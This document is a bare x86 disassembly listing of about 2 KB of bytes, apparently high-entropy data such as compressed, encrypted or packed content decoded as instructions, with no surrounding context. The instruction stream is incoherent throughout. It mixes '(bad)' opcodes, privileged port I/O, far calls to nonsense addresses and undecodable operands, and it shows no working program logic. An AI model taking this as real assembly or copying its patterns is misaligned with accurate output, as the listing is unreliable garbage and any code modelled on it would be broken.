  41fa21:	cmp    bh,BYTE PTR [ebx]
  41fa23:	xor    eax,0x3fa12576
  41fa28:	dec    edi
  41fa29:	ror    DWORD PTR [esi+0x3b64512f],1
  41fa2f:	mov    edi,0xca2afe83
  41fa34:	add    cl,BYTE PTR [eax]
  41fa36:	and    esi,DWORD PTR [esi+0x51]
  41fa39:	shl    dh,cl
  41fa3b:	ds (bad) 
  41fa3d:	fistp  DWORD PTR [eax-0x80]
  41fa40:	mov    bl,0x32
  41fa42:	inc    edx
  41fa43:	inc    edx
  41fa44:	not    BYTE PTR [esi]
  41fa46:	fwait
  41fa47:	mov    esp,0x85b68a1d
  41fa4c:	xor    dl,BYTE PTR [ebp-0x35a0d95d]
  41fa52:	outs   dx,BYTE PTR ds:[esi]
  41fa53:	adc    ch,ah
  41fa55:	pop    eax
  41fa56:	sbb    ah,dl
  41fa58:	and    al,0x8c
  41fa5a:	out    dx,eax
  41fa5b:	mov    bl,0x30
  41fa5d:	fidiv  WORD PTR [esi]
  41fa5f:	inc    esp
  41fa60:	jns    0x41f9e5
  41fa62:	jg     0x41fa18
  41fa64:	fwait
  41fa65:	or     al,0x13
  41fa67:	jge    0x41f9f9
  41fa69:	sub    ah,BYTE PTR [edi+edx*8+0x4]
  41fa6d:	in     eax,dx
  41fa6e:	sti    
  41fa6f:	(bad)  
  41fa70:	pop    ecx
  41fa71:	push   0x5b
  41fa73:	out    dx,al
  41fa74:	jno    0x41fa7a
  41fa76:	xchg   esp,eax
  41fa77:	retf   
  41fa78:	in     al,dx
  41fa79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa7a:	xor    al,0x25
  41fa7c:	xchg   esp,eax
  41fa7d:	test   eax,0x231fe541
  41fa82:	inc    ebp
  41fa83:	out    0x6f,al
  41fa85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa86:	jle    0x41fa6a
  41fa88:	dec    ebp
  41fa89:	mov    DWORD PTR ds:0x223a212c,esi
  41fa8f:	adc    DWORD PTR [edi+edx*1-0x3c],0x98567cf9
  41fa97:	and    edx,ecx
  41fa99:	repnz mov al,bh
  41fa9c:	icebp  
  41fa9d:	mov    ebp,DWORD PTR [eax-0xf]
  41faa0:	bound  ebx,QWORD PTR [edx-0x6]
  41faa3:	jle    0x41fa30
  41faa5:	fwait
  41faa6:	adc    al,BYTE PTR [edx]
  41faa8:	cmc    
  41faa9:	add    DWORD PTR [edi],esi
  41faab:	cmp    DWORD PTR [esi],ebp
  41faad:	das    
  41faae:	out    0x76,al
  41fab0:	leave  
  41fab1:	mov    dl,0x4f
  41fab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fab4:	in     al,0xd9
  41fab6:	and    cl,BYTE PTR [ebp+0x5ee1c40e]
  41fabc:	or     al,0x9a
  41fabe:	and    BYTE PTR [ebp+0x680b18fb],0xcd
  41fac5:	fwait
  41fac6:	jp     0x41fb09
  41fac8:	inc    eax
  41fac9:	js     0x41faa0
  41facb:	pop    ebx
  41facc:	and    edx,edi
  41face:	call   0xf6612576
  41fad3:	addr16 or eax,ebx
  41fad6:	and    DWORD PTR [ebp+0x2f],0xffffffb5
  41fada:	popa   
  41fadb:	or     eax,DWORD PTR [esi]
  41fadd:	and    eax,0x16b14444
  41fae2:	sbb    dl,dl
  41fae4:	inc    esi
  41fae5:	push   ss
  41fae6:	or     eax,0x73d53bd5
  41faeb:	or     DWORD PTR ds:0xe4826151,eax
  41faf1:	jg     0x41fafa
  41faf3:	fs add eax,0xc127363
  41faf9:	in     eax,0x31
  41fafb:	retf   0x95d7
  41fafe:	mov    eax,ds:0xec46230c
  41fb03:	test   eax,0x2925da94
  41fb08:	and    al,0xed
  41fb0a:	gs sub eax,0x16f1b5b9
  41fb10:	sbb    DWORD PTR [ecx],esi
  41fb12:	xchg   ebx,eax
  41fb13:	and    BYTE PTR [edx],0xf
  41fb16:	dec    edx
  41fb17:	and    eax,0xd9045818
  41fb1c:	in     al,dx
  41fb1d:	adc    eax,0x6b0f86fe
  41fb22:	outs   dx,DWORD PTR ds:[esi]
  41fb23:	inc    ecx
  41fb24:	pop    esp
  41fb25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb26:	mov    ss,WORD PTR [ebp+0x2d82180b]
  41fb2c:	test   BYTE PTR [edi-0x13],ch
  41fb2f:	mov    eax,ds:0xe8ea36bf
  41fb34:	add    al,0x7e
  41fb36:	xor    bh,BYTE PTR [ebx+0x66792666]
  41fb3c:	das    
  41fb3d:	call   DWORD PTR [eax]
  41fb3f:	(bad)  [esi-0x13]
  41fb42:	inc    edi
  41fb43:	xor    DWORD PTR [edx+0x38],0x9865420b
  41fb4a:	sar    DWORD PTR [esi],cl
  41fb4c:	adc    ebp,DWORD PTR [eax]
  41fb4e:	mov    bh,0x5c
  41fb50:	repz lock cmp al,0xcd
  41fb54:	mov    edx,0x11de3183
  41fb59:	arpl   WORD PTR [ecx+0x5b],si
  41fb5c:	add    eax,0x780e5bc
  41fb61:	fisttp DWORD PTR [ebx+0xe]
  41fb64:	adc    BYTE PTR [edx-0x2b862319],0xda
  41fb6b:	sar    DWORD PTR [ecx+0x567f9276],1
  41fb71:	out    dx,eax
  41fb72:	lds    ebp,FWORD PTR [esi+0x14]
  41fb75:	xor    BYTE PTR [eax+0xf],ch
  41fb78:	lods   eax,DWORD PTR ds:[esi]
  41fb79:	inc    eax
  41fb7a:	mov    ds:0x949b9943,eax
  41fb7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb80:	out    dx,eax
  41fb81:	ret    
  41fb82:	imul   edx,DWORD PTR [edx],0x23
  41fb85:	mov    DWORD PTR [esi+0x3a],ecx
  41fb88:	sub    ecx,DWORD PTR [ecx+0x77]
  41fb8b:	mov    dh,0xef
  41fb8d:	inc    ecx
  41fb8e:	lahf   
  41fb8f:	add    dh,BYTE PTR [edi]
  41fb91:	cmc    
  41fb92:	adc    eax,0x51d8cbba
  41fb97:	ins    BYTE PTR es:[edi],dx
  41fb98:	fist   DWORD PTR [ebx+0x1]
  41fb9b:	lea    ebp,[eax]
  41fb9d:	sbb    ecx,DWORD PTR [edi-0x80]
  41fba0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fba1:	jno    0x41fbf1
  41fba3:	sbb    al,0xb8
  41fba5:	outs   dx,DWORD PTR ds:[esi]
  41fba6:	jge    0x41fb46
  41fba8:	pushf  
  41fba9:	jae    0x41fc0a
  41fbab:	cmp    al,0x5b
  41fbad:	dec    esp
  41fbae:	xor    eax,0x64c23ca5
  41fbb3:	push   ebx
  41fbb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbb5:	outs   dx,DWORD PTR ds:[esi]
  41fbb6:	arpl   WORD PTR [eax],bp
  41fbb8:	cdq    
  41fbb9:	fs xchg edx,eax
  41fbbb:	in     eax,0xf3
  41fbbd:	jmp    DWORD PTR ds:0xea526251
  41fbc3:	shr    BYTE PTR [ebx],cl
  41fbc5:	xchg   edi,eax
  41fbc6:	lods   eax,DWORD PTR ds:[esi]
  41fbc7:	add    ecx,esp
  41fbc9:	xchg   ebp,eax
  41fbca:	cmp    ebx,ebp
  41fbcc:	sti    
  41fbcd:	adc    DWORD PTR [ebp+0x7c62083c],edi
  41fbd3:	xchg   BYTE PTR [eax-0x69a5db35],ah
  41fbd9:	add    ecx,esp
  41fbdb:	rcr    BYTE PTR [ebp-0x6c],cl
  41fbde:	lock xor eax,0x70c9ad35
  41fbe4:	mov    ecx,0x19d52073
  41fbe9:	sbb    eax,0x5d1326ef
  41fbee:	adc    ebp,eax
  41fbf0:	xchg   ecx,eax
  41fbf1:	pop    edi
  41fbf2:	lods   al,BYTE PTR ds:[esi]
  41fbf3:	push   edx
  41fbf4:	add    ch,bh
  41fbf6:	adc    edi,ebp
  41fbf8:	popf   
  41fbf9:	xor    DWORD PTR [esi-0x289e4c0a],edi
  41fbff:	int3   
  41fc00:	aad    0x94
  41fc02:	push   edi
  41fc03:	xchg   edi,eax
  41fc04:	and    edx,edx
  41fc06:	inc    ebp
  41fc07:	cmp    ebx,DWORD PTR [ebx]
  41fc09:	mov    cl,0xbd
  41fc0b:	cmc    
  41fc0c:	shl    BYTE PTR [ecx],1
  41fc0e:	je     0x41fc03
  41fc10:	retf   0xaee
  41fc13:	popf   
  41fc14:	retf   0x26b2
  41fc17:	ds or  al,0xe3
  41fc1a:	xor    al,0xfb
  41fc1c:	pop    ecx
  41fc1d:	dec    ecx
  41fc1e:	jecxz  0x41fc19
  41fc20:	imul   ecx,DWORD PTR [eax+0x1f162f0],0xffffffb3
  41fc27:	fist   WORD PTR [ecx]
  41fc29:	inc    ecx
  41fc2a:	popa   
  41fc2b:	mov    esp,0xe2204d2f
  41fc30:	je     0x41fc4f
  41fc32:	mov    edi,0xb9a230f3
  41fc37:	lds    eax,FWORD PTR gs:[edx+0x2f]
  41fc3b:	cmp    al,0xc2
  41fc3d:	or     al,0xe0
  41fc3f:	cmp    DWORD PTR ds:0x4a7480b1,eax
  41fc45:	cli    
  41fc46:	cdq    
  41fc47:	mov    cl,0xb7
  41fc49:	out    dx,eax
  41fc4a:	jge    0x41fc73
  41fc4c:	xor    dh,BYTE PTR [ecx-0x33]
  41fc4f:	ins    DWORD PTR es:[edi],dx
  41fc50:	aaa    
  41fc51:	dec    eax
  41fc52:	ror    ecx,0x74
  41fc55:	add    BYTE PTR [ebx-0x9],al
  41fc58:	jno    0x41fbfe
  41fc5a:	inc    edx
  41fc5b:	dec    esp
  41fc5c:	jne    0x41fc60
  41fc5e:	push   ecx
  41fc5f:	scas   eax,DWORD PTR es:[edi]
  41fc60:	xor    eax,0x1effa014
  41fc65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc66:	and    ebp,edx
  41fc68:	sbb    esp,ebp
  41fc6a:	mov    eax,0x26c5fc4e
  41fc6f:	test   DWORD PTR [ebx+ecx*8+0x41],0x473e6085
  41fc77:	push   0xdb241b4c
  41fc7c:	fld    QWORD PTR [edi+0x6e]
  41fc7f:	push   esi
  41fc80:	and    DWORD PTR [eax-0x71be3e5e],ecx
  41fc86:	inc    eax
  41fc87:	pop    es
  41fc88:	lahf   
  41fc89:	aad    0x8e
  41fc8b:	inc    esp
  41fc8c:	movd   mm2,DWORD PTR [ebp-0x27]
  41fc90:	push   eax
  41fc91:	or     edx,DWORD PTR [edx+0x7f]
  41fc94:	adc    edi,edi
  41fc96:	add    BYTE PTR [ebx+0x76],al
  41fc99:	inc    ecx
  41fc9a:	loop   0x41fc86
  41fc9c:	js     0x41fcf8
  41fc9e:	and    DWORD PTR ds:[ebx-0x6890d3],0xcbeb3ce1
  41fca9:	pop    ebx
  41fcaa:	jmp    0xbb5aaf6a
  41fcaf:	jns    0x41fc35
  41fcb1:	mov    ds:0x1bf24767,al
  41fcb6:	cdq    
  41fcb7:	call   0x10e9:0xf6f8fcbd
  41fcbe:	dec    edi
  41fcbf:	fs mov esp,0xd4de25da
  41fcc5:	inc    eax
  41fcc6:	jbe    0x41fcef
  41fcc8:	jmp    0x8a79d9aa
  41fccd:	cld    
  41fcce:	out    0x28,al
  41fcd0:	fst    st(6)
  41fcd2:	imul   ebx,DWORD PTR [ecx-0x2ca2b820],0xffffff85
  41fcd9:	push   ecx
  41fcda:	adc    al,0x74
  41fcdc:	mov    ecx,0x8d9c881
  41fce1:	sbb    ch,BYTE PTR [eax+0x1a]
  41fce4:	push   0xb8260590
  41fce9:	inc    ebx
  41fcea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fceb:	mov    edx,0xc2d11491
  41fcf0:	dec    ebx
  41fcf1:	arpl   WORD PTR [ebp+0x55],bp
  41fcf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcf5:	mov    bl,0xf1
  41fcf7:	mov    cl,0xac
  41fcf9:	dec    eax
  41fcfa:	call   0x43a8b937
  41fcff:	stc    
  41fd00:	xor    BYTE PTR [edi-0x5a],dl
  41fd03:	sbb    esp,DWORD PTR [edx+esi*1]
  41fd06:	push   eax
  41fd07:	mov    ebp,0x20e665d2
  41fd0c:	and    BYTE PTR [eax-0x53],ch
  41fd0f:	scas   eax,DWORD PTR es:[edi]
  41fd10:	loope  0x41fcb4
  41fd12:	vunpcklps ymm4,ymm3,ymm2
  41fd16:	test   al,0xd1
  41fd18:	fild   WORD PTR [edx-0x2d]
  41fd1b:	je     0x41fd66
  41fd1d:	pop    ss
  41fd1e:	mov    ds:0xa2df4df9,al
  41fd23:	push   esp
  41fd24:	push   edi
  41fd25:	cs push cs
  41fd27:	mov    ecx,0x575e97e1
  41fd2c:	nop
  41fd2d:	or     al,0x16
  41fd2f:	xchg   edi,eax
  41fd30:	out    0x12,eax
  41fd32:	push   edx
  41fd33:	in     eax,0xbb
  41fd35:	adc    DWORD PTR [edx+ebp*8],ecx
  41fd38:	xchg   esp,esp
  41fd3a:	jnp    0x41fcf7
  41fd3c:	retf   0x6988
  41fd3f:	jl     0x41fcd0
  41fd41:	jmp    0xa4cc346c
  41fd46:	loope  0x41fcff
  41fd48:	sub    BYTE PTR [ebx+0x3b],ch
  41fd4b:	or     cl,bh
  41fd4d:	retf   0xc958
  41fd50:	stos   BYTE PTR es:[edi],al
  41fd51:	dec    ebp
  41fd52:	mov    al,ds:0xbc62547
  41fd57:	lea    edi,[ecx]
  41fd59:	jl     0x41fd8e
  41fd5b:	push   ss
  41fd5c:	xchg   BYTE PTR [edi-0x370bea52],ch
  41fd62:	inc    ecx
  41fd63:	test   eax,0xb5898296
  41fd68:	cmp    DWORD PTR [edi+eiz*2],ebp
  41fd6b:	call   FWORD PTR [ebp-0x4dcc8363]
  41fd71:	inc    BYTE PTR [edx]
  41fd73:	gs jge 0x41fd1e
  41fd76:	rol    eax,0x36
  41fd79:	sub    eax,0x4586c7ed
  41fd7e:	(bad)  
  41fd7f:	shl    BYTE PTR [edi],cl
  41fd81:	xchg   ebx,eax
  41fd82:	test   esi,edx
  41fd84:	es inc ecx
  41fd86:	imul   esi,DWORD PTR [esi],0x4e
  41fd89:	icebp  
  41fd8a:	and    esi,edx
  41fd8c:	inc    ecx
  41fd8d:	push   0xffffffa2
  41fd8f:	bswap  ebx
  41fd91:	fiadd  WORD PTR [ecx-0x68cce3ab]
  41fd97:	out    0x49,eax
  41fd99:	pushf  
  41fd9a:	or     al,0x79
  41fd9c:	xlat   BYTE PTR ds:[ebx]
  41fd9d:	mov    dl,0x4c
  41fd9f:	adc    ch,cl
  41fda1:	(bad)  
  41fda3:	inc    edx
  41fda4:	mov    edi,0xd3573dea
  41fda9:	daa    
  41fdaa:	stc    
  41fdab:	xchg   esi,eax
  41fdac:	add    bl,al
  41fdae:	outs   dx,BYTE PTR ds:[esi]
  41fdaf:	arpl   WORD PTR [esi-0x16],bp
  41fdb2:	iret   
  41fdb3:	push   esp
  41fdb4:	loop   0x41fd9c
  41fdb6:	hlt    
  41fdb7:	mov    edi,0xe19741f4
  41fdbc:	int    0x5d
  41fdbe:	add    ecx,edx
  41fdc0:	mov    al,ds:0x62998f1f
  41fdc5:	sub    BYTE PTR [eax-0x7e],0xbb
  41fdc9:	jmp    0x46def3ea
  41fdce:	popa   
  41fdcf:	sbb    DWORD PTR [esi],edx
  41fdd1:	add    al,0x29
  41fdd3:	jae    0x41fdaa
  41fdd5:	cli    
  41fdd6:	lods   al,BYTE PTR ds:[esi]
  41fdd7:	xor    bl,BYTE PTR [ecx-0x5]
  41fdda:	call   0xac66:0xe5f1ae35
  41fde1:	and    eax,0x59b534ac
  41fde6:	pop    edx
  41fde7:	jne    0x41fe11
  41fde9:	(bad)  
  41fdea:	bound  edi,QWORD PTR [eax+0x11]
  41fded:	imul   edi,eax,0x79
  41fdf0:	add    DWORD PTR [eax],eax
  41fdf2:	jecxz  0x41fe2e
  41fdf4:	sub    eax,0x788e1173
  41fdf9:	clc    
  41fdfa:	and    eax,0xd79812f0
  41fdff:	inc    esp
  41fe00:	scas   al,BYTE PTR es:[edi]
  41fe01:	test   al,0x15
  41fe03:	add    eax,0x282eb578
  41fe08:	cmp    edi,DWORD PTR [ebp-0x124dbc33]
  41fe0e:	xor    al,0xab
  41fe10:	mov    edx,0x13428f22
  41fe15:	dec    edx
  41fe16:	dec    edx
  41fe17:	std    
  41fe18:	jge    0x41fe54
  41fe1a:	retf   0xd988
  41fe1d:	jle    0x41fde0
  41fe1f:	scas   eax,DWORD PTR es:[edi]
  41fe20:	sahf   
  41fe21:	xchg   edx,eax
  41fe22:	xchg   ebp,eax
  41fe23:	cmp    eax,0x3dad3acd
  41fe28:	out    0x3b,al
  41fe2a:	cwde   
  41fe2b:	xor    al,0x85
  41fe2d:	cmp    al,0x41
  41fe2f:	dec    ebp
  41fe30:	sbb    bh,bh
  41fe32:	lods   eax,DWORD PTR ds:[esi]
  41fe33:	adc    al,0xf7
  41fe35:	outs   dx,BYTE PTR ds:[esi]
  41fe36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe37:	mov    ds:0x9fdfcb2d,eax
  41fe3c:	adc    dh,BYTE PTR [ecx-0x268bfb3a]
  41fe42:	pop    ecx
  41fe43:	mov    bh,0x2c
  41fe45:	stos   DWORD PTR es:[edi],eax
  41fe46:	inc    ecx
  41fe47:	ja     0x41fe3f
  41fe49:	adc    eax,0xcd849ac2
  41fe4e:	in     al,dx
  41fe4f:	dec    ebx
  41fe50:	sub    eax,DWORD PTR [esi+eax*1+0x44f26a3e]
  41fe57:	and    edi,DWORD PTR [esi]
  41fe59:	push   0x1c77287
  41fe5e:	add    DWORD PTR [edi],edi
  41fe60:	and    DWORD PTR [ecx+ecx*2-0x561ffff8],esp
  41fe67:	shl    ah,0x43
  41fe6a:	mov    WORD PTR [ebx+0x27f70903],es
  41fe70:	gs dec edi
  41fe72:	sub    bl,BYTE PTR [ecx+ecx*4]
  41fe75:	bound  ebx,QWORD PTR [eax-0x21c7a137]
  41fe7b:	mov    ebp,0x9dc9b598
  41fe80:	lods   al,BYTE PTR ds:[esi]
  41fe81:	xor    ecx,eax
  41fe83:	or     DWORD PTR [ecx],ebp
  41fe85:	pusha  
  41fe86:	mov    ds,WORD PTR [ebp-0x4b8b86ab]
  41fe8c:	outs   dx,DWORD PTR ds:[esi]
  41fe8d:	cmp    edx,0x730718ce
  41fe93:	add    ah,BYTE PTR [ecx]
  41fe95:	fwait
  41fe96:	mov    DWORD PTR [edi],ebx
  41fe98:	sti    
  41fe99:	inc    ebx
  41fe9a:	push   es
  41fe9b:	inc    ebx
  41fe9c:	mov    cl,0x84
  41fe9e:	inc    ebx
  41fe9f:	outs   dx,BYTE PTR ds:[esi]
  41fea0:	xor    eax,0x2bbabd72
  41fea5:	push   esp
  41fea6:	jb     0xe986ecfe
  41feac:	dec    edx
  41fead:	mov    ah,0x2d
  41feaf:	pop    ss
  41feb0:	ins    BYTE PTR es:[edi],dx
  41feb1:	mov    esp,0xbfb2bc1d
  41feb6:	cwde   
  41feb7:	(bad)  
  41feb8:	dec    DWORD PTR [eax+0x56d270b5]
  41febe:	jb     0x41fea3
  41fec0:	jnp    0x41fefc
  41fec2:	push   es
  41fec3:	test   eax,0x437fcef
  41fec8:	imul   esp,DWORD PTR [edx+eax*4+0x6e],0xe276c438
  41fed0:	pushf  
  41fed1:	adc    al,0x46
  41fed3:	inc    ebp
  41fed4:	inc    eax
  41fed5:	mov    edx,0x1beb2d24
  41feda:	sbb    BYTE PTR [ebx+ebp*8-0x27],cl
  41fede:	jbe    0x41fe68
  41fee0:	out    dx,eax
  41fee1:	in     al,dx
  41fee2:	scas   eax,DWORD PTR es:[edi]
  41fee3:	je     0x41ff15
  41fee5:	stos   BYTE PTR es:[edi],al
  41fee6:	pop    eax
  41fee7:	jl     0x41ff53
  41fee9:	(bad)  [eax+0x3d06c60b]
  41feef:	mov    ecx,DWORD PTR [esi]
  41fef1:	jmp    0x44037890
  41fef6:	mov    ecx,0xeb0a4e5c
  41fefb:	test   dh,cl
  41fefd:	loope  0x41fec2
  41feff:	call   0xc474:0x84c2700
  41ff06:	jl     0x41ff5c
  41ff08:	mov    bh,0x90
  41ff0a:	ds push edx
  41ff0c:	mov    ch,0xfe
  41ff0e:	jp     0x41ff45
  41ff10:	xor    ecx,DWORD PTR [edi+eax*1]
  41ff13:	sbb    al,0xb3
  41ff15:	sbb    al,0x68
  41ff17:	and    al,0x37
  41ff19:	test   BYTE PTR [esi-0x6d1480bd],ch
  41ff1f:	jecxz  0x41fed0
  41ff21:	mov    ds:0x4636e0d5,al
  41ff26:	mov    WORD PTR [ecx+0x794cfec3],ds
  41ff2c:	(bad)  
  41ff2d:	ror    BYTE PTR [esi],1
  41ff2f:	pop    ecx
  41ff30:	fdivrp st(4),st
  41ff32:	clc    
  41ff33:	imul   ecx,DWORD PTR [edx],0xf97205a3
  41ff39:	mov    bl,0xb6
  41ff3b:	iret   
  41ff3c:	aas    
  41ff3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff3e:	adc    eax,0xb48150ec
  41ff43:	iret   
  41ff44:	fidivr WORD PTR [eax+ebx*2+0x38d488f5]
  41ff4b:	push   0x1121d0da
  41ff50:	jmp    0xfc5dc864
  41ff55:	xor    DWORD PTR [edx+0x16],esi
  41ff58:	and    al,0x6
  41ff5a:	test   DWORD PTR [eax+0x520e9281],ebp
  41ff60:	jbe    0x41fef7
  41ff62:	aaa    
  41ff63:	jne    0x41ff1c
  41ff65:	inc    esi
  41ff66:	int    0xea
  41ff68:	mov    ch,0xfc
  41ff6a:	adc    eax,0x300cb00f
  41ff6f:	test   DWORD PTR [esp+ecx*1+0x2b58b475],eax
  41ff76:	xchg   edx,eax
  41ff77:	xchg   esp,eax
  41ff78:	add    DWORD PTR [esi+edx*1-0x1e],ebp
  41ff7c:	js     0x41ff5d
  41ff7e:	xchg   edi,eax
  41ff7f:	(bad)  
  41ff80:	call   0xf3cd59f
  41ff85:	cli    
  41ff86:	pop    ebx
  41ff87:	ds cdq 
  41ff89:	jno    0x41ffed
  41ff8b:	pusha  
  41ff8c:	outs   dx,BYTE PTR cs:[esi]
  41ff8e:	mov    edx,0x301759f3
  41ff93:	push   esp
  41ff94:	mov    edi,0xd9f2fd86
  41ff99:	popa   
  41ff9a:	out    dx,eax
  41ff9b:	add    DWORD PTR cs:[esi],ecx
  41ff9e:	mov    edi,0xeaa9dc1a
  41ffa3:	mov    ds:0x2259de3b,eax
  41ffa8:	jne    0x420010
  41ffaa:	push   0x56
  41ffac:	adc    eax,0x21b0a8a6
  41ffb1:	shl    BYTE PTR ds:[eax],cl
  41ffb4:	mov    dh,0xc0
  41ffb6:	lods   al,BYTE PTR ds:[esi]
  41ffb7:	imul   esp,DWORD PTR [esi],0x58
  41ffba:	sti    
  41ffbb:	push   0xe2d2a03a
  41ffc0:	pusha  
  41ffc1:	in     al,dx
  41ffc2:	dec    ebx
  41ffc3:	repnz rol ebx,cl
  41ffc6:	rcr    esi,cl
  41ffc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffc9:	int3   
  41ffca:	sub    eax,DWORD PTR [ecx-0x7b]
  41ffcd:	sub    DWORD PTR [ecx-0x13],ebp
  41ffd0:	pop    ebp
  41ffd1:	cmc    
  41ffd2:	sti    
  41ffd3:	push   es
  41ffd4:	mov    dh,0xce
  41ffd6:	xchg   ecx,eax
  41ffd7:	shl    DWORD PTR [edi+0x809bb91],1
  41ffdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffde:	push   ecx
  41ffdf:	sbb    eax,0x35201dbd
  41ffe4:	add    al,0x5c
  41ffe6:	mov    bh,0xa7
  41ffe8:	xchg   edx,eax
  41ffe9:	jecxz  0x41ff8c
  41ffeb:	mov    ebp,edx
  41ffed:	mov    DWORD PTR [ecx+0x72],ebp
  41fff0:	dec    edi
  41fff1:	xchg   esp,eax
  41fff2:	jo     0x41ff7d
  41fff4:	jl     0x41ffb8
  41fff6:	and    al,BYTE PTR [eax+0x33048ce0]
  41fffc:	in     eax,0xd9
  41fffe:	jnp    0x41fff9
  420000:	test   al,0x84
  420002:	jno    0x420023
  420004:	mov    edx,0x1704c1bd
  420009:	retf   0x9fbb
  42000c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42000d:	call   0x4483:0xeaaa81b3
  420014:	mov    ?,WORD PTR [ebx]
  420016:	xor    al,0x19
  420018:	pop    esi
  420019:	iret   
  42001a:	jle    0x41ffc3
  42001c:	dec    edi
  42001d:	loope  0x420046
  42001f:	mov    BYTE PTR [esi-0x714a71c7],dl
  420025:	stos   BYTE PTR es:[edi],al
  420026:	(bad)  
  420027:	cmp    ebx,DWORD PTR [edi-0xa003f9b]
  42002d:	loope  0x420039
  42002f:	ret    
  420030:	cmp    dl,BYTE PTR [ebx+0x15380835]
  420036:	adc    BYTE PTR [edx+0x6],bl
  420039:	lods   al,BYTE PTR ds:[esi]
  42003a:	jb     0x41ffe4
  42003c:	and    al,0xb9
  42003e:	daa    
  42003f:	xor    eax,0xe8f7a2ba
  420044:	iret   
  420045:	xchg   ebp,eax
  420046:	imul   dl
  420048:	cmc    
  420049:	sub    edi,esp
  42004b:	mov    ebx,0xdcc40563
  420050:	jne    0x41ffe5
  420052:	push   ebp
  420053:	jb     0x420068
  420055:	fistp  WORD PTR [esi]
  420057:	ror    DWORD PTR ds:0xe2c3afe,cl
  42005d:	mov    ecx,0xee8fb8d2
  420062:	shl    BYTE PTR [esi-0x62d58dd9],cl
  420068:	or     edx,DWORD PTR [ebx]
  42006a:	imul   edi,DWORD PTR [ecx+eax*1],0x993bb4f4
  420071:	stos   BYTE PTR es:[edi],al
  420072:	jg     0x420056
  420074:	adc    BYTE PTR [ebx+0x11d4fd14],cl
  42007a:	jns    0x42009e
  42007c:	inc    eax
  42007d:	arpl   WORD PTR [esi],dx
  42007f:	sub    ebp,ecx
  420081:	mov    cl,0x83
  420083:	pop    edx
  420084:	test   eax,0xb8bc5052
  420089:	xchg   esp,eax
  42008a:	ret    0x85a3
  42008d:	sub    eax,0x60550f1f
  420092:	push   cs
  420093:	or     al,0xc9
  420095:	ja     0x420022
  420097:	jmp    0x420066
  420099:	pop    ebp
  42009a:	fwait
  42009b:	cmp    BYTE PTR [esi-0x8],ch
  42009e:	pop    eax
  42009f:	out    dx,eax
  4200a0:	inc    ebp
  4200a1:	lods   al,BYTE PTR ds:[esi]
  4200a2:	push   esi
  4200a3:	loop   0x42008d
  4200a5:	pop    ecx
  4200a6:	jmp    0xd83177d4
  4200ab:	or     DWORD PTR [ebx+eiz*8-0x2e],eax
  4200af:	aam    0x2d
  4200b1:	mov    dl,0x59
  4200b3:	dec    edi
  4200b4:	xlat   BYTE PTR ds:[ebx]
  4200b5:	and    al,dl
  4200b7:	test   al,0x5b
  4200b9:	fcomp  QWORD PTR [ebp+0x1c0ef78a]
  4200bf:	mov    dh,0x39
  4200c1:	pop    edx
  4200c2:	pushf  
  4200c3:	cld    
  4200c4:	in     al,0xfc
  4200c6:	and    DWORD PTR [edx],ecx
  4200c8:	fcmovbe st,st(0)
  4200ca:	fcomp  DWORD PTR [ebp-0x7a]
  4200cd:	pop    ebp
  4200ce:	mov    edi,0xc8fbd40d
  4200d3:	addr16 mov bl,0x18
  4200d6:	mov    ebp,DWORD PTR [ebx-0x41]
  4200d9:	imul   edx,DWORD PTR [ebp+0x6c019a7a],0x6c
  4200e0:	mov    edx,0xc0077b92
  4200e5:	cs xor al,0x19
  4200e8:	fisub  WORD PTR [esi+edi*1-0x1]
  4200ec:	push   esi
  4200ed:	icebp  
  4200ee:	mov    ch,0xd2
  4200f0:	mov    edi,0x1398ed5e
  4200f5:	mov    WORD PTR [ecx+esi*4],?
  4200f8:	dec    eax
  4200f9:	mov    ds:0xf9cb5c27,eax
  4200fe:	xchg   edi,eax
  4200ff:	leave  
  420100:	imul   ecx,DWORD PTR [edi+0x22],0xed5b737a
  420107:	mov    edx,0x7b9a48db
  42010c:	cmp    DWORD PTR [eax],ebx
  42010e:	and    ch,BYTE PTR [edi+0x7d]
  420111:	in     al,dx
  420112:	push   ds
  420113:	frstor [edx+0x5225c079]
  420119:	lock xchg ecx,eax
  42011b:	sbb    BYTE PTR [ebx-0x6196452f],ah
  420121:	push   es
  420122:	ins    BYTE PTR es:[edi],dx
  420123:	pop    eax
  420124:	pusha  
  420125:	push   0xffffff9f
  420127:	ficomp DWORD PTR [esp+eax*1+0x1b]
  42012b:	add    ecx,eax
  42012d:	sbb    cl,0x3e
  420130:	or     eax,0x5127e967
  420135:	jb     0x420172
  420137:	jnp    0x4200cf
  420139:	jmp    DWORD PTR [eax]
  42013b:	xor    edx,ebp
  42013d:	psraw  mm0,mm5
  420140:	out    dx,eax
  420141:	in     eax,dx
  420142:	cld    
  420143:	pop    es
  420144:	popf   
  420145:	sub    ebx,0x7f
  420148:	mov    ch,0xb9
  42014a:	push   cs
  42014b:	jb     0x4201c2
  42014d:	dec    ecx
  42014e:	xchg   esp,eax
  42014f:	or     eax,0x6a2244e4
  420154:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420155:	mov    dl,0x6d
  420157:	mov    DWORD PTR [esi-0x77e16aed],ecx
  42015d:	mov    al,0xe1
  42015f:	cwde   
  420160:	loopne 0x4200e8
  420162:	push   ebp
  420163:	mov    bl,0xeb
  420165:	push   ebp
  420166:	inc    cx
  420168:	cmp    BYTE PTR [esi-0x74],dl
  42016b:	cmp    eax,0xfb198d3e
  420170:	add    al,0x7d
  420172:	or     esi,ebp
  420174:	mov    dl,0x93
  420176:	ja     0x420153
  420178:	loop   0x420143
  42017a:	sbb    bh,BYTE PTR [ebx]
